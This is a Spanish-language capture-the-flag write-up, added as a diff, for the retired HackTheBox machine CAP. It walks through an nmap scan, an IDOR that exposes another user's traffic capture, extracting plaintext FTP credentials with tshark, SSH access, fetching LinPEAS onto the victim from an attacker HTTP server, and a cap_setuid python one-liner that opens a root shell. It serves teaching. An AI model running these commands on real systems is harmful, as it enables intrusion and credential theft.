@@ -1,0 +1,281 @@
+# HackTheBox — CAP
+
+![HTB Badge](https://img.shields.io/badge/HackTheBox-CAP-brightgreen?style=for-the-badge&logo=hackthebox&logoColor=white)
+![Dificultad](https://img.shields.io/badge/Dificultad-Easy-green?style=for-the-badge)
+![OS](https://img.shields.io/badge/OS-Linux-blue?style=for-the-badge&logo=linux&logoColor=white)
+![Estado](https://img.shields.io/badge/Estado-Retirada-red?style=for-the-badge)
+
+---
+
+## Índice
+
+1. [Información de la máquina](#información-de-la-máquina)
+2. [Reconocimiento](#reconocimiento)
+3. [Enumeración Web](#enumeración-web)
+4. [Vulnerabilidad IDOR](#vulnerabilidad-idor)
+5. [Análisis del PCAP](#análisis-del-pcap)
+6. [Acceso inicial — User Flag](#acceso-inicial--user-flag)
+7. [Escalada de privilegios — Root Flag](#escalada-de-privilegios--root-flag)
+8. [Conclusión](#conclusión)
+
+---
+
+## Información de la máquina
+
+| Campo        | Valor                  |
+|-------------|------------------------|
+| **Nombre**   | CAP                    |
+| **IP**       | 10.10.10.245           |
+| **OS**       | Linux                  |
+| **Dificultad** | Easy               |
+| **Puntos**   | 20                     |
+| **Creador**  | InfoSecJack            |
+
+**Descripción oficial:**
+> CAP es una máquina Linux de dificultad fácil que ejecuta un servidor HTTP con funciones administrativas, incluyendo la captura de tráfico de red. Los controles incorrectos dan lugar a una vulnerabilidad IDOR (Insecure Direct Object Reference) que permite acceder a la captura de tráfico de otro usuario. Dicha captura contiene credenciales en texto plano que permiten obtener acceso inicial. Posteriormente, una Linux Capability mal configurada permite escalar a root.
+
+**Conceptos clave:**
+- IDOR (Insecure Direct Object Reference)
+- Análisis de tráfico de red (PCAP / Wireshark / tshark)
+- FTP en texto plano
+- Linux Capabilities (`cap_setuid`)
+- Escalada de privilegios con Python
+
+---
+
+## Reconocimiento
+
+### Nmap — Escaneo de puertos
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.245 -oG allPorts
+```
+
+```
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+```
+
+### Nmap — Escaneo detallado de servicios
+
+```bash
+nmap -p21,22,80 -sCV 10.10.10.245 -oN targeted
+```
+
+```
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
+80/tcp open  http    gunicorn
+| http-title: Security Dashboard
+```
+
+**Observaciones:**
+- **Puerto 21 (FTP):** vsftpd 3.0.3, sin acceso anónimo.
+- **Puerto 22 (SSH):** OpenSSH 8.2p1.
+- **Puerto 80 (HTTP):** Aplicación web tipo "Security Dashboard" corriendo con Gunicorn (Python).
+
+---
+
+## Enumeración Web
+
+Al acceder a `http://10.10.10.245` encontramos un panel de administración con el usuario **nathan** ya autenticado. El panel tiene las siguientes secciones en el menú lateral:
+
+- **Dashboard** — Vista general
+- **Security Snapshot (5 Second PCAP + Analysis)** — Permite realizar capturas de red
+- **IP Config** — Información de red del servidor
+- **Network Status** — Estado de la red
+
+Al hacer clic en **Security Snapshot**, la aplicación realiza una captura de tráfico de 5 segundos y nos redirige a una URL con la siguiente estructura:
+
+```
+http://10.10.10.245/data/1
+```
+
+---
+
+## Vulnerabilidad IDOR
+
+La URL generada por la aplicación utiliza un identificador numérico incremental (`/data/1`, `/data/2`, etc.) para referenciar las capturas de red. No existe ningún control de acceso que verifique si el archivo pertenece al usuario actual.
+
+**Prueba de concepto:**
+
+```bash
+curl -s http://10.10.10.245/data/0 -o 0.pcap
+```
+
+Al modificar manualmente el ID a `0`, obtenemos una captura de red correspondiente a otro usuario. Este es un ejemplo clásico de **IDOR (Insecure Direct Object Reference)**, una vulnerabilidad del Top 10 de OWASP.
+
+```
+http://10.10.10.245/data/0   <-- Captura de otro usuario ✓
+http://10.10.10.245/data/1   <-- Nuestra propia captura
+```
+
+---
+
+## Análisis del PCAP
+
+Descargamos el archivo `0.pcap` y lo analizamos en busca de credenciales en texto plano. FTP transmite las credenciales sin cifrar, por lo que son directamente visibles en la captura.
+
+### Con tshark
+
+```bash
+tshark -r 0.pcap -Y "ftp" -Tfields -e tcp.payload 2>/dev/null | xxd -ps -r
+```
+
+### Con Wireshark
+
+Aplicar el filtro:
+```
+ftp
+```
+
+En el tráfico capturado se observa la autenticación FTP completa:
+
+```
+220 (vsFTPd 3.0.3)
+USER nathan
+331 Please specify the password.
+PASS Buck3tH4TF0RM3!
+230 Login successful.
+```
+
+**Credenciales encontradas:**
+
+| Usuario | Contraseña       |
+|---------|-----------------|
+| nathan  | Buck3tH4TF0RM3! |
+
+---
+
+## Acceso inicial — User Flag
+
+Las credenciales obtenidas del PCAP funcionan tanto para FTP como para SSH (reutilización de credenciales).
+
+### Conexión por SSH
+
+```bash
+ssh nathan@10.10.10.245
+# Contraseña: Buck3tH4TF0RM3!
+```
+
+```
+nathan@cap:~$
+```
+
+### User Flag
+
+```bash
+cat /home/nathan/user.txt
+```
+
+```
+[USER FLAG]
+```
+
+---
+
+## Escalada de privilegios — Root Flag
+
+### Enumeración con LinPEAS
+
+Transferimos y ejecutamos LinPEAS para enumerar posibles vectores de escalada:
+
+```bash
+# En nuestra máquina atacante
+wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+python3 -m http.server 8080
+
+# En la máquina víctima
+wget http://<TU_IP>:8080/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh
+```
+
+### Linux Capabilities
+
+LinPEAS identifica una capability peligrosa asignada a Python:
+
+```bash
+/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
+```
+
+También podemos verificarlo manualmente:
+
+```bash
+getcap -r / 2>/dev/null
+```
+
+```
+/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
+```
+
+**¿Qué significa `cap_setuid`?**
+
+La capability `cap_setuid` permite a un proceso modificar su UID efectivo. Esto significa que podemos usar Python para establecer nuestro UID a `0` (root) sin necesitar la contraseña de root.
+
+### Explotación
+
+```bash
+python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+```
+
+```
+root@cap:/home/nathan#
+```
+
+¡Somos root! 🎉
+
+### Root Flag
+
+```bash
+cat /root/root.txt
+```
+
+```
+[ROOT FLAG]
+```
+
+---
+
+## Conclusión
+
+### Resumen del ataque
+
+```
+[Reconocimiento]
+       ↓
+[Puerto 80 — Dashboard web con usuario nathan logueado]
+       ↓
+[IDOR en /data/0 → Descarga de captura PCAP ajena]
+       ↓
+[Análisis PCAP → Credenciales FTP en texto plano]
+       ↓
+[SSH como nathan → User Flag]
+       ↓
+[cap_setuid en python3.8 → os.setuid(0) → Root]
+       ↓
+[Root Flag]
+```
+
+### Vulnerabilidades explotadas
+
+| Vulnerabilidad | Descripción |
+|----------------|-------------|
+| **IDOR** | La aplicación no verifica si el PCAP solicitado pertenece al usuario autenticado |
+| **FTP en texto plano** | Las credenciales se transmiten sin cifrar y quedan expuestas en capturas de red |
+| **Reutilización de credenciales** | Las mismas credenciales de FTP se usan para SSH |
+| **Linux Capability mal configurada** | `cap_setuid` en Python permite escalar a root trivialmente |
+
+### Lecciones aprendidas
+
+- Siempre implementar controles de acceso basados en el usuario propietario del recurso (evitar IDOR).
+- Nunca usar FTP para transmitir credenciales; usar SFTP o FTPS.
+- No reutilizar contraseñas entre servicios.
+- Revisar las Linux Capabilities asignadas a binarios (`getcap -r /`), especialmente en lenguajes de scripting como Python.
+
+---
+
+*Writeup realizado con fines educativos. Esta máquina se encuentra retirada y requiere suscripción VIP en HackTheBox para acceder a ella.*
